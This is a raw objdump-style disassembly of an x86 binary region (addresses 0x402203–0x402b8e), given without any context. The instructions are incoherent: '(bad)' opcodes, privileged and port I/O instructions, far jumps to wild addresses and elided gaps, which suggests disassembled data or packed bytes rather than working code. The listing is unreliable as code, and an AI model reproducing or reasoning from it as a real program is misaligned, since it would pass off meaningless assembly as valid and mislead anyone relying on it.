  402203:	jmp    0xee64685f
  402208:	xlat   BYTE PTR ds:[ebx]
  402209:	add    DWORD PTR [edx],edx
  40220b:	lock test BYTE PTR [ebp+0x7f],bh
  40220f:	jmp    0x40db:0xae2c3a57
  402216:	xlat   BYTE PTR ds:[ebx]
  402217:	inc    ecx
  402218:	inc    edx
  402219:	std    
  40221a:	push   0x32f88d48
  40221f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402220:	fist   DWORD PTR [eax-0x10]
  402223:	ret    
  402224:	add    ebp,DWORD PTR [edx-0x59]
  402227:	xor    BYTE PTR [edi+0x10],dl
  40222a:	dec    eax
  40222b:	jle    0x40220c
  40222d:	call   0x44525c
  402232:	lods   al,BYTE PTR ds:[esi]
  402233:	sub    DWORD PTR [eax+0xa],ebx
  402236:	fadd   DWORD PTR [ecx]
  402238:	sub    ebp,edi
  40223a:	sub    BYTE PTR [eax],cl
  40223c:	sub    eax,0x8ced0cff
  402241:	inc    ebp
  402242:	mov    bl,0xe4
  402244:	ret    
  402245:	je     0x4021f1
  402247:	lock push esi
  402249:	clc    
  40224a:	sbb    BYTE PTR [edx],al
  40224c:	jmp    0xd21e9d31
  402251:	push   0xffffffe8
  402253:	add    ecx,ebp
  402255:	mov    eax,gs
  402257:	or     ch,BYTE PTR [ecx+0x44838b56]
  40225d:	cld    
	...
  402272:	add    BYTE PTR [esi+0x628cd753],ah
  402278:	cli    
  402279:	sub    BYTE PTR [eax+edx*8],dh
  40227c:	push   esp
  40227d:	aad    0xe0
  40227f:	push   edx
  402280:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402282:	push   esi
  402283:	mov    bl,0xdf
  402285:	adc    al,0xc
  402287:	iret   
  402288:	and    BYTE PTR [esi-0x5fc14f20],dl
  40228e:	lds    edx,FWORD PTR [ebx-0x6c72e3fe]
  402294:	test   ah,bh
  402296:	or     esp,DWORD PTR [esi+0x1a83e902]
  40229c:	or     al,0x6e
  40229e:	push   ss
  40229f:	pop    ss
  4022a0:	sub    al,0xa8
  4022a2:	add    esi,DWORD PTR [eax]
  4022a4:	dec    eax
  4022a5:	icebp  
  4022a6:	ins    DWORD PTR es:[edi],dx
  4022a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022a8:	fstp   st(4)
  4022aa:	div    DWORD PTR [ecx+0x58]
  4022ad:	stc    
  4022ae:	loopne 0x4022a2
  4022b0:	push   cs
  4022b1:	inc    esi
  4022b2:	push   esi
  4022b3:	scas   eax,DWORD PTR es:[edi]
  4022b4:	jmp    0xc520:0xde58e135
  4022bb:	mov    bh,0x2
  4022bd:	add    al,ah
  4022bf:	sbb    al,0xb3
  4022c1:	cmp    ch,ah
  4022c3:	dec    BYTE PTR [ebx]
  4022c5:	jmp    0x3f3c9cd
  4022ca:	push   esp
  4022cb:	mov    ds:0x15121b83,eax
  4022d0:	lods   al,BYTE PTR ds:[esi]
  4022d1:	add    eax,0xd7f41582
  4022d6:	repnz add BYTE PTR [eax],al
	...
  4022e9:	add    BYTE PTR [eax],al
  4022eb:	add    BYTE PTR [edi+0x1d0700e0],dh
  4022f1:	test   DWORD PTR [ecx+edi*2-0x18ffbc7b],0xaada57eb
  4022fc:	mov    esi,0x1c3eec89
  402301:	dec    eax
  402302:	or     dh,dl
  402304:	xor    ecx,DWORD PTR [edx+0x502df57d]
  40230a:	adc    dl,dh
  40230c:	jmp    0x402364
  40230e:	sbb    BYTE PTR [edx+0x1b],ah
  402311:	(bad)  
  402312:	jmp    0xaba6:0x2505b6e1
  402319:	add    al,BYTE PTR [eax]
  40231b:	jb     0x4022cc
  40231d:	xchg   DWORD PTR [eax+0x8],esi
  402320:	push   0x2
  402322:	xor    ebp,DWORD PTR [ebx+0x7ee8e060]
  402328:	pop    ebx
  402329:	cmp    eax,0x2b7abc9
  40232e:	push   ebp
  40232f:	bound  edx,QWORD PTR [edi-0x63137ccf]
  402335:	add    dh,BYTE PTR [ebp-0x12]
  402338:	imul   eax,DWORD PTR [edi+0x8],0x43cb4a
  40233f:	push   0x6
  402341:	lldt   sp
  402344:	mov    eax,ds:0x45f545c5
  402349:	sub    al,BYTE PTR [ecx-0x17]
  40234c:	jns    0x4023a5
  40234e:	or     BYTE PTR [ecx+0x0],al
	...
  402365:	mov    al,0xcf
  402367:	add    cl,ch
  402369:	sbb    eax,0xb09cffba
  40236e:	jmp    0x3103:0x2a32c35
  402375:	in     al,0x31
  402377:	call   0x1d6c4a
  40237c:	add    BYTE PTR [ebp+0x1675ff9e],dl
  402382:	adc    al,ch
  402384:	aas    
  402385:	retf   
  402386:	push   es
  402387:	add    bh,bh
  402389:	xchg   ebx,eax
  40238a:	or     eax,0xb3cae853
  40238f:	add    BYTE PTR [eax],al
  402391:	jne    0x402353
  402393:	pop    ebx
  402394:	leave  
  402395:	cmp    al,0x9
  402397:	add    BYTE PTR [ebp-0x7b],dl
  40239a:	in     eax,dx
  40239b:	push   ebx
  40239c:	sub    DWORD PTR [ebx+0xe],0x0
  4023a0:	jne    0x402363
  4023a2:	ret    
  4023a3:	inc    ebp
  4023a4:	or     ch,bl
  4023a6:	sub    BYTE PTR [ecx+0x0],al
  4023a9:	cmp    eax,0xa3000c62
  4023ae:	add    eax,0xdfca45c7
  4023b3:	sub    BYTE PTR [ecx-0x42],al
  4023b6:	mov    ebx,0xe8260875
  4023bb:	int3   
  4023bc:	add    BYTE PTR [esi-0x6c002777],cl
  4023c2:	or     al,0xe8
  4023c4:	loope  0x402410
  4023c6:	add    BYTE PTR [eax],al
  4023c8:	add    eax,DWORD PTR [eax]
	...
  4023de:	ss inc ecx
  4023e0:	push   ebx
  4023e1:	call   0x3fdcbb
  4023e6:	cmc    
  4023e7:	xchg   edi,eax
  4023e8:	push   DWORD PTR [ebp-0x7a]
  4023eb:	adc    eax,ebp
  4023ed:	jmp    0x402379
  4023ef:	(bad)  
  4023f0:	(bad)  
  4023f1:	(bad)  
  4023f2:	and    ecx,DWORD PTR [ebx+edx*2]
  4023f5:	call   0x40eff0
  4023fa:	cdq    
  4023fb:	cmp    cl,BYTE PTR [eax]
  4023fd:	call   0x3fdcd8
  402402:	mov    ch,0xc0
  402404:	pop    ebx
  402405:	leave  
  402406:	mov    WORD PTR [edi],es
  402408:	add    BYTE PTR [ebp-0x59],dl
  40240b:	pusha  
  40240c:	out    dx,eax
  40240d:	and    DWORD PTR [ebx+0xe],0x36
  402411:	push   0x3eaaa
  402416:	unpckhps xmm3,xmm2
  402419:	call   DWORD PTR [eax]
  40241b:	arpl   WORD PTR [eax-0x4],cx
  40241e:	and    al,0xaf
  402420:	jno    0x40244b
  402422:	jmpw   0x9929
  402426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402427:	mov    al,0xf6
  402429:	(bad)  
  40242a:	jp     0x4023e1
  40242c:	push   0x0
  40242e:	jge    0x402419
  402430:	fdiv   QWORD PTR [ebp-0x51]
  402433:	das    
  402434:	add    al,0xff
  402436:	mov    dl,0x37
  402438:	sub    eax,DWORD PTR [ecx-0x59]
  40243b:	outs   dx,BYTE PTR ds:[esi]
  40243c:	les    edi,FWORD PTR [ecx+0x5f]
  40243f:	lods   al,BYTE PTR ds:[esi]
  402440:	push   edi
  402441:	cld    
	...
  402456:	add    bh,cl
  402458:	std    
  402459:	fdivr  st,st(7)
  40245b:	mov    eax,0xa7fc47a4
  402460:	jmp    0x54282468
  402465:	sub    eax,DWORD PTR [ecx-0x59]
  402468:	jo     0x402499
  40246a:	mov    esi,DWORD PTR [eax-0x35f7b8b0]
  402470:	push   esp
  402471:	pop    ebp
  402472:	dec    DWORD PTR [eax-0x5fbbe6e]
  402478:	add    BYTE PTR [edx+0x0],ch
  40247b:	sub    ah,BYTE PTR [edi+0x47ff500b]
  402481:	sub    al,BYTE PTR [ecx-0x59]
  402484:	dec    esp
  402485:	adc    ch,al
  402487:	add    al,BYTE PTR [ebp+ebx*8-0x1]
  40248b:	lods   al,BYTE PTR ds:[esi]
  40248c:	sub    DWORD PTR [eax+0x5],ebx
  40248f:	push   ds
  402490:	scas   al,BYTE PTR es:[edi]
  402491:	fucomip st,st(3)
  402493:	lahf   
  402494:	push   0x22404c5
  402499:	out    0x3,al
  40249b:	mov    dl,0xcc
  40249d:	jb     0x4024e6
  40249f:	xor    edi,DWORD PTR [ebx]
  4024a1:	and    dl,al
  4024a3:	mov    ds:0x1388b402,eax
  4024a8:	das    
  4024a9:	jb     0x4024f2
  4024ab:	scas   eax,DWORD PTR es:[edi]
  4024ac:	pop    es
  4024ad:	sub    DWORD PTR [eax-0x56],ebx
  4024b0:	xor    BYTE PTR [ecx+0x31089203],0x4
  4024b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024b8:	add    ch,cl
  4024ba:	cmp    BYTE PTR [eax],al
	...
  4024d0:	out    dx,al
  4024d1:	mov    edi,0x27d03e5
  4024d6:	inc    ebx
  4024d7:	add    al,0x7d
  4024d9:	inc    DWORD PTR [edx+0x4]
  4024dc:	dec    ebp
  4024dd:	add    dl,BYTE PTR [ecx-0x7c]
  4024e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024e1:	add    ch,cl
  4024e3:	fcomp  QWORD PTR [edx+0xa]
  4024e6:	shl    esp,0xdc
  4024e9:	add    ecx,ebp
  4024eb:	mov    bh,bl
  4024ed:	es test eax,0x3a073340
  4024f3:	in     al,dx
  4024f4:	leave  
  4024f5:	(bad)  
  4024f6:	jmp    0xe94113fe
  4024fb:	add    esp,DWORD PTR [edi-0x5c3e4fc3]
  402501:	add    dl,BYTE PTR [ecx+ecx*4]
  402504:	or     DWORD PTR [esi-0x3d63f3d4],0xfffffff5
  40250b:	push   es
  40250c:	daa    
  40250d:	sbb    ebp,ecx
  40250f:	push   esi
  402510:	scas   al,BYTE PTR es:[edi]
  402511:	call   0xc120:0x2a703e9
  402518:	mov    ds:0xaf564e02,eax
  40251d:	jmp    0xdb6a:0x2a7c83b
  402524:	push   eax
  402525:	dec    edi
  402526:	add    ah,ah
  402528:	std    
  402529:	repnz (bad) 
  40252b:	call   0x29d52ed4
  402530:	stos   DWORD PTR es:[edi],eax
  402531:	nop
  402532:	rcl    BYTE PTR [edx],0x0
	...
  402549:	test   eax,0xa4e9009a
  40254e:	add    cl,cl
  402550:	sub    ebp,DWORD PTR [eax+0x8725502]
  402556:	xchg   ah,al
  402558:	std    
  402559:	jg     0x40255d
  40255b:	push   0xffffffe9
  40255d:	jmp    0x4025ae
  40255f:	or     BYTE PTR [ecx],al
  402561:	out    dx,eax
  402562:	int    0x0
  402564:	jmp    0x13b4e812
  402569:	mov    ebx,0xc98ae832
  40256e:	fcos   
  402570:	pusha  
  402571:	data16 (bad) 
  402573:	pop    eax
  402574:	sbb    esp,edi
  402576:	dec    edi
  402577:	cld    
  402578:	mov    esi,0x79e80a76
  40257d:	fadd   DWORD PTR [edx]
  40257f:	add    dl,ah
  402581:	in     al,0x4f
  402583:	or     al,0xa6
  402585:	push   esi
  402586:	(bad)  
  402587:	call   0x19f6a5
  40258c:	ret    0xede4
  40258f:	add    esp,DWORD PTR [edx-0x1a]
  402592:	(bad)  
  402593:	leave  
  402594:	stos   DWORD PTR es:[edi],eax
  402595:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402596:	add    dl,BYTE PTR [ebp+0x72]
  402599:	jg     0x4025d0
  40259b:	mov    edx,DWORD PTR [edi+ebx*4]
  40259e:	ins    BYTE PTR es:[edi],dx
  40259f:	adc    BYTE PTR [edx],bl
  4025a1:	xchg   ebx,eax
  4025a2:	jle    0x40259e
  4025a4:	pop    sp
  4025a6:	ins    BYTE PTR es:[edi],dx
  4025a7:	add    bl,dl
  4025a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4025aa:	ins    BYTE PTR es:[edi],dx
  4025ab:	add    eax,ebx
	...
  4025c1:	add    BYTE PTR [esp+ebp*2+0x2a4c103],ah
  4025c8:	add    BYTE PTR [eax],al
  4025ca:	into   
  4025cb:	mov    ebp,0x29f60875
  4025d0:	retf   
  4025d1:	add    BYTE PTR [esi],bh
  4025d3:	xchg   BYTE PTR [ebx],al
  4025d5:	inc    eax
  4025d6:	cli    
  4025d7:	adc    BYTE PTR [edx+0x0],ch
  4025da:	(bad)  
  4025db:	in     al,dx
  4025dc:	ins    BYTE PTR es:[edi],dx
  4025dd:	retf   
  4025de:	ds add eax,0x67424389
  4025e4:	add    BYTE PTR [edx+0xe],ch
  4025e7:	add    BYTE PTR [bp+si+0xc],ch
  4025eb:	addr16 add bh,bh
  4025ee:	dec    ebp
  4025ef:	in     eax,dx
  4025f0:	pop    esi
  4025f1:	retf   
  4025f2:	inc    BYTE PTR [ebx+ecx*1]
  4025f5:	sar    BYTE PTR [edx+0x2c],0x89
  4025f9:	inc    ebx
  4025fa:	or     ah,BYTE PTR [edi+0x0]
  4025fd:	push   0xfffffffe
  4025ff:	data16 add BYTE PTR [edx-0x6],ch
  402603:	adc    al,0xe8
  402605:	dec    edi
  402606:	add    eax,0x8d890005
  40260b:	push   es
  40260c:	or     eax,eax
  40260e:	fwait
  40260f:	and    bh,bh
  402611:	jae    0x4025cd
  402613:	in     al,dx
  402614:	repnz retf 0x4ce
  402618:	push   DWORD PTR [ebx]
  40261a:	push   ss
  40261b:	call   0xc3fe26ea
  402620:	add    edi,edi
  402622:	adc    DWORD PTR [edi+edi*8+0xeb],edi
	...
  402639:	add    BYTE PTR [eax],al
  40263b:	cmp    DWORD PTR [ebp-0x39bd17cd],0x0
  402642:	add    BYTE PTR [ecx+0x1],cl
  402645:	(bad)  
  402646:	call   DWORD PTR [ecx]
  402648:	mov    ebp,0x4137c02b
  40264d:	or     BYTE PTR [edi],cl
  40264f:	sti    
  402650:	ret    
  402651:	pop    ebx
  402652:	leave  
  402653:	mov    esp,0xa755000b
  402658:	fs out 0x53,eax
  40265b:	sub    al,0xa7
  40265d:	or     eax,DWORD PTR [ebx+0x174f409c]
  402663:	push   eax
  402664:	popf   
  402665:	or     ebp,eax
  402667:	sahf   
  402668:	and    al,0x3
  40266a:	add    BYTE PTR [eax-0x63],al
  40266d:	jmp    edi
  40266f:	or     dl,BYTE PTR [ebx+eax*1]
  402672:	add    BYTE PTR [eax],dh
  402674:	mov    ebp,0xea5da6eb
  402679:	add    ebx,DWORD PTR [ebx-0x12]
  40267c:	sub    edi,edi
  40267e:	push   DWORD PTR [ebx+0x54]
  402681:	out    0x81,eax
  402683:	jmp    0x40268e
  402685:	jmp    0xc283:0x327808ff
  40268c:	bound  ebp,QWORD PTR [ebx]
  40268e:	inc    ecx
  40268f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402690:	jmp    0xef303be4
  402695:	mov    ch,BYTE PTR [eax]
  402697:	jmpw   0xb186
  40269b:	fmulp  st(0),st
  40269d:	fld    st(7)
	...
  4026b3:	add    BYTE PTR [edx-0x58bed3ae],ah
  4026b9:	jmp    0x6ce726c1
  4026be:	pop    ss
  4026bf:	lea    ecx,[edi+0x3300042a]
  4026c5:	(bad)  
  4026c6:	fdiv   DWORD PTR ds:0x42b222
  4026cc:	mov    edi,0xa0ffdafd
  4026d1:	mov    al,ds:0x2acf8cff
  4026d6:	add    al,0x0
  4026d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026d9:	jmp    0x5962b3e1
  4026de:	jmp    0xec39a7e2
  4026e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026e4:	ja     0x4026e8
  4026e6:	fldenvw [edx]
  4026e9:	jge    0x402738
  4026eb:	jmp    0xebf9fe58
  4026f0:	cmp    eax,0x2ad94ed2
  4026f5:	cmp    eax,0x71bf3445
  4026fa:	adc    DWORD PTR [ebx-0x59],eax
  4026fd:	push   0xffffffeb
  4026ff:	add    esp,DWORD PTR [edi+0x6c714182]
  402705:	add    ch,cl
  402707:	or     al,0x67
  402709:	pop    es
  40270a:	fs cmp eax,0xc0e902a6
  402710:	sub    cl,dh
  402712:	(bad)  
  402713:	fcomp  DWORD PTR [eax]
  402715:	add    ch,cl
  402717:	add    eax,DWORD PTR [eax]
	...
  40272d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40272e:	mov    edi,0xd6f8dc64
  402733:	neg    al
  402735:	mov    al,0x2
  402737:	jmp    0xe9accea9
  40273c:	ins    DWORD PTR es:[edi],dx
  40273d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40273e:	ins    BYTE PTR es:[edi],dx
  40273f:	jmp    0xc71a49ca
  402744:	fsub   st,st(0)
  402746:	xor    DWORD PTR [esi+edi*2-0x25],ebx
  40274a:	out    0xc6,al
  40274c:	fdiv   DWORD PTR [edi-0x29]
  40274f:	je     0x402720
  402751:	mov    eax,0x3ad8b6d6
  402756:	(bad)  
  402757:	shl    DWORD PTR [esi],0xec
  40275a:	add    ecx,ebp
  40275c:	or     al,0xe7
  40275e:	push   es
  40275f:	fs hlt 
  402761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402762:	add    ch,cl
  402764:	imul   eax,DWORD PTR [esi+0xf04282b],0x74
  40276b:	rol    DWORD PTR [edx-0x59],1
  40276e:	jmp    0xe200:0xd688d7fe
  402775:	fs push es
  402777:	test   BYTE PTR [eax-0x5c],bh
  40277a:	add    al,BYTE PTR [eax]
  40277c:	jb     0x4027b2
  40277e:	mov    BYTE PTR [ebp-0x2980a3],al
  402784:	mov    ecx,0x4dbcea9a
  402789:	jg     0x402761
  40278b:	or     ebp,DWORD PTR [ecx]
  40278d:	lahf   
  40278e:	jle    0x40276a
  402790:	jmp    0x402795
	...
  4027a5:	add    BYTE PTR [edx+eax*1-0x19bb9377],ah
  4027ac:	jmp    FWORD PTR [esi]
  4027ae:	and    DWORD PTR [eax-0x29b0e918],eax
  4027b4:	push   eax
  4027b5:	xchg   ecx,eax
  4027b6:	jmp    0x2968e5
  4027bb:	(bad)  
  4027bc:	loopne 0x4027bc
  4027be:	lock aad 0x68
  4027c1:	jmp    0x402767
  4027c3:	add    al,BYTE PTR [eax-0x25c8ef]
  4027c9:	imul   BYTE PTR [edx+eax*8+0x319650f]
  4027d0:	add    cl,ch
  4027d2:	and    eax,0x6aee01db
  4027d7:	jbe    0x4027d9
  4027d9:	jmp    0x953f5a82
  4027de:	retf   
  4027df:	in     eax,0xff
  4027e1:	(bad)  
  4027e2:	fwait
  4027e3:	aad    0xb5
  4027e5:	mov    ecx,0xc1ffd5c0
  4027ea:	ret    0xffce
  4027ed:	scas   al,BYTE PTR es:[edi]
  4027ee:	cs sub al,0x96
  4027f2:	fcom   st(5)
  4027f4:	push   eax
  4027f5:	adc    esi,esi
  4027f7:	sub    al,BYTE PTR [ecx-0x17]
  4027fa:	jns    0x40278b
  4027fc:	loopne 0x40287c
  4027fe:	jo     0x4027d5
  402800:	push   0x17c00
  402805:	xor    BYTE PTR [esi],0x45
  402808:	sti    
  402809:	inc    DWORD PTR [eax]
	...
  40281f:	stc    
  402820:	or     eax,eax
  402822:	je     0x4027e6
  402824:	cmp    DWORD PTR [ebp-0x522618],0x4ff85001
  40282e:	push   eax
  40282f:	retf   
  402830:	cmp    esp,0xffffffef
  402833:	jmp    0x172878e5
  402838:	mov    BYTE PTR [eax],0x0
  40283b:	mov    al,BYTE PTR cs:[ebp-0x521604]
  402842:	push   eax
  402843:	mov    DWORD PTR [ebx-0x14],esi
  402846:	out    dx,eax
  402847:	mov    DWORD PTR [ebp-0x526d3018],ebp
  40284d:	call   FWORD PTR [eax-0x47]
  402850:	jae    0x40283a
  402852:	out    dx,eax
  402853:	test   eax,0xd3ff50ad
  402858:	jmp    0xf4bc:0xe909ffef
  40285f:	stc    
  402860:	stos   DWORD PTR es:[edi],eax
  402861:	call   0xffec1e7f
  402866:	jmp    0x402806
  402868:	mov    eax,DWORD PTR [ebp-0x542604]
  40286e:	push   eax
  40286f:	out    0xfb,al
  402871:	enter  0xce00,0x40
  402875:	push   eax
  402876:	lea    eax,[ebx-0x53]
  402879:	out    dx,eax
  40287a:	dec    DWORD PTR [ecx]
  40287c:	adc    edi,edi
  40287e:	mov    ch,0xea
  402880:	(bad)  
  402882:	inc    DWORD PTR [eax]
	...
  402898:	out    0x51,al
  40289a:	hlt    
  40289b:	dec    DWORD PTR [ecx]
  40289d:	jmp    0xac4a2094
  4028a2:	push   DWORD PTR [ebp-0x197659]
  4028a8:	cwde   
  4028a9:	sbb    dh,0xf7
  4028ac:	nop
  4028ad:	jge    0x402885
  4028af:	test   DWORD PTR [ebx-0x7100297b],edx
  4028b5:	adc    eax,0x6578ffd5
  4028ba:	push   eax
  4028bb:	cld    
  4028bc:	jg     0x4028aa
  4028be:	leave  
  4028bf:	add    BYTE PTR [edi+0x1aff03af],ah
  4028c5:	cmp    ah,dh
  4028c7:	call   FWORD PTR [eax+0x42]
  4028ca:	xor    esi,esp
  4028cc:	push   eax
  4028cd:	cmp    eax,0x4f480069
  4028d2:	out    0xef,eax
  4028d4:	inc    eax
  4028d5:	or     eax,0x253343eb
  4028da:	(bad)  
  4028db:	lea    ebp,[edx]
  4028dd:	push   es
  4028de:	out    0xff,al
  4028e0:	sub    BYTE PTR [edx-0x2e84a2a],bl
  4028e6:	aad    0xff
  4028e8:	(bad)  
  4028ea:	int3   
  4028eb:	add    BYTE PTR [edi+0x5c78c366],ah
  4028f1:	aam    0x8f
  4028f3:	lock adc ch,cl
  4028f6:	aad    0xe8
  4028f8:	pop    eax
  4028f9:	aam    0xd5
  4028fb:	inc    DWORD PTR [eax]
	...
  402911:	push   ds
  402912:	addr16 in al,dx
  402914:	out    dx,eax
  402915:	call   0xcff5fece
  40291a:	mov    esp,0x64cfffd5
  40291f:	int    0xff
  402921:	ror    BYTE PTR [eax-0x1699d775],1
  402927:	aam    0xb5
  402929:	retf   
  40292a:	mov    esp,0x67cfffd5
  40292f:	int3   
  402930:	add    BYTE PTR [edi+0x33c3f202],ah
  402936:	div    DWORD PTR [ecx-0x79]
  402939:	(bad)  
  40293a:	jecxz  0x4028d2
  40293c:	aad    0x2c
  40293e:	shl    BYTE PTR [edx+0x17],cl
  402941:	push   ds
  402942:	sub    ch,BYTE PTR [eax]
  402944:	add    al,0x94
  402946:	sahf   
  402947:	jle    0x4028d8
  402949:	mov    esp,ebx
  40294b:	jbe    0x402922
  40294d:	(bad)
  402951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402952:	test   DWORD PTR [eax+eiz*8+0x78],ebp
  402956:	rcr    DWORD PTR [esi+0x34],cl
  402959:	pusha  
  40295a:	lea    eax,[ebp-0x1b]
  40295d:	pop    eax
  40295e:	rol    DWORD PTR [ecx+0x53],cl
  402961:	pop    esi
  402962:	add    ch,cl
  402964:	jle    0x4029cd
  402966:	pop    edx
  402967:	mov    dl,0xd4
  402969:	cli    
  40296a:	in     eax,0x46
  40296c:	aad    0x38
  40296e:	jmp    0x7f70:0xd330e62f
	...
  402989:	add    BYTE PTR [edi],bh
  40298b:	jecxz  0x4029ab
  40298d:	aad    0x20
  40298f:	lea    eax,[ecx]
  402991:	in     eax,0x18
  402993:	rol    DWORD PTR [ecx],cl
  402995:	push   ss
  402996:	sbb    bl,dl
  402998:	push   es
  402999:	mov    eax,ds:0x3a82a1a
  40299e:	add    BYTE PTR [ebp-0x2d071af3],cl
  4029a4:	add    DWORD PTR [ebx],esp
  4029a6:	fild   WORD PTR [ecx]
  4029a8:	jmp    0x28e10b5
  4029ad:	mov    DWORD PTR [edx],esi
  4029af:	jmp    0x88d9:0x86d8d4c6
  4029b6:	xchg   edx,eax
  4029b7:	test   DWORD PTR [ecx],edx
  4029b9:	inc    ebx
  4029ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029bb:	iret   
  4029bc:	test   esp,edx
  4029be:	cli    
  4029bf:	fld    QWORD PTR [eax]
  4029c1:	(bad)  
  4029c2:	rcl    edx,cl
  4029c4:	call   0x4206aa
  4029c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029ca:	sbb    edx,edx
  4029cc:	out    dx,eax
  4029cd:	sahf   
  4029ce:	jnp    0x4029ab
  4029d0:	pop    edx
  4029d1:	xchg   DWORD PTR [ebx-0x2e],esi
  4029d4:	call   DWORD PTR [eax+ecx*4-0x1e]
  4029d8:	inc    DWORD PTR [esi+0x7eee427c]
  4029de:	pop    ebx
  4029df:	xor    bl,BYTE PTR [esi-0x60]
  4029e2:	cmp    BYTE PTR [bp+di-0x183],cl
  4029e7:	cli    
  4029e8:	out    0x52,eax
  4029ea:	pop    edx
  4029eb:	sar    bh,cl
  4029ed:	jb     0x4029ef
	...
  402a03:	adc    al,0xd2
  402a05:	xor    eax,0x438c4e
  402a0a:	pop    esi
  402a0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a0c:	shl    DWORD PTR [ebp-0xf],1
  402a0f:	and    eax,DWORD PTR [ebp+0x4]
  402a12:	jo     0x402a65
  402a14:	jmp    0xbbe4d241
  402a19:	ret    0xa4e5
  402a1c:	aaa    
  402a1d:	mov    edx,DWORD PTR ds:0xb6f8c727
  402a23:	arpl   WORD PTR [eax-0x8],cx
  402a26:	jmp    0x6a402ccf
  402a2b:	jns    0x402a27
  402a2d:	(bad)  
  402a2e:	jl     0x402a46
  402a30:	shl    DWORD PTR [ebp-0x13],1
  402a33:	fist   DWORD PTR [edi+0x8]
  402a36:	and    DWORD PTR [edx+ebx*8-0x2e2b0cfa],0xffffff89
  402a3e:	sub    al,0xd7
  402a40:	fld    QWORD PTR [edi]
  402a42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a43:	outs   dx,BYTE PTR ds:[esi]
  402a44:	into   
  402a45:	add    cl,ch
  402a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a48:	add    cl,BYTE PTR [ebx+0x411abc0c]
  402a4e:	add    BYTE PTR [esi-0x7474ec50],bh
  402a54:	mov    dl,0x3b
  402a56:	inc    edi
  402a57:	retf   0x92a
  402a5a:	(bad)  
  402a5b:	mov    edi,DWORD PTR [esi+0x5be0001]
  402a61:	jmp    0x402a69
  402a63:	adc    eax,0xff0af6
	...
  402a7c:	mov    ebx,0x367d83af
  402a81:	push   es
  402a82:	jne    0x402a8c
  402a84:	and    DWORD PTR [ebx],ebp
  402a86:	cld    
  402a87:	call   0x3fe098
  402a8c:	add    eax,0x475ff83c
  402a91:	enter  0x8,0x29
  402a95:	push   eax
  402a96:	cmp    eax,0x47b6e7
  402a9b:	jmp    0x402ae3
  402a9d:	or     al,0x8b
  402a9f:	aas    
  402aa0:	out    0x3d,al
  402aa2:	idiv   bh
  402aa4:	loope  0x402a77
  402aa6:	(bad)  
  402aa7:	jne    0x402b23
  402aa9:	mov    ebp,0x47a6e705
  402aae:	add    BYTE PTR [eax],al
  402ab0:	ds add eax,0xb7d5f00
  402ab6:	mov    ebp,esp
  402ab8:	pop    ecx
  402ab9:	or     ebp,DWORD PTR [edx+0x0]
  402abc:	mov    cl,0x2b
  402abe:	or     al,ch
  402ac0:	leave  
  402ac1:	mov    edi,0xbe95ffff
  402ac6:	push   DWORD PTR [ebp-0xa]
  402ac9:	lods   al,BYTE PTR ds:[esi]
  402aca:	and    al,bh
  402acc:	push   cs
  402acd:	add    eax,0x2afff883
  402ad2:	xorps  xmm7,XMMWORD PTR [esi-0xc]
  402ad6:	and    DWORD PTR [ebp-0x2a],esi
  402ad9:	ror    BYTE PTR [ebp+0x7edaa777],0xc8
	...
  402af4:	add    ah,dl
  402af6:	xchg   BYTE PTR [edx],dh
  402af8:	push   0x44f271
  402afd:	pop    eax
  402afe:	mov    bl,0x6e
  402b00:	enter  0xdba7,0xfe
  402b04:	mov    edi,0x40c9e73b
  402b09:	mov    ds:0xd5c5ddb,eax
  402b0e:	fidivr DWORD PTR [edx]
  402b10:	call   0x43cd3d
  402b15:	pushf  
  402b16:	cdq    
  402b17:	push   edi
  402b18:	add    eax,0xeb03da61
  402b1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b1f:	or     al,BYTE PTR [eax]
  402b21:	rol    BYTE PTR [ecx-0x2658394e],1
  402b27:	xchg   al,bh
  402b29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b2a:	mov    al,0x6
  402b2c:	(bad)  
  402b2d:	test   al,0xd9
  402b2f:	jle    0x402af8
  402b31:	stc    
  402b32:	cwde   
  402b33:	mov    esp,0x38d9abc2
  402b38:	mov    edi,DWORD PTR [ebx]
  402b3a:	pop    ebp
  402b3b:	(bad)  
  402b3c:	cld    
  402b3d:	sub    al,0xa7
  402b3f:	inc    DWORD PTR [edi+eiz*4]
  402b42:	test   eax,0x41d70003
  402b47:	shl    ebp,0x28
  402b4a:	sub    DWORD PTR [ebp+eax*2+0x23],edi
  402b4e:	icebp  
  402b4f:	push   edi
  402b50:	or     al,0x18
  402b52:	outs   dx,DWORD PTR ds:[esi]
  402b53:	iret   
  402b54:	call   FWORD PTR [edx+0xf4dbe1]
	...
  402b6e:	adc    cl,BYTE PTR [ecx]
  402b70:	sar    bh,cl
  402b72:	jp     0x402b1d
  402b74:	shl    BYTE PTR [ebp-0x55],cl
  402b77:	fcom   DWORD PTR [edi-0x4]
  402b7a:	jmp    DWORD PTR [ecx+0x8]
  402b7d:	add    BYTE PTR [edi-0x1ca819fe],ah
  402b83:	fidivr DWORD PTR [ecx-0x29]
  402b86:	fmul   st,st(7)
  402b88:	mov    al,ds:0x3a02a3c6
  402b8d:	pop    esp
  402b8e:	xchg   esp,eax
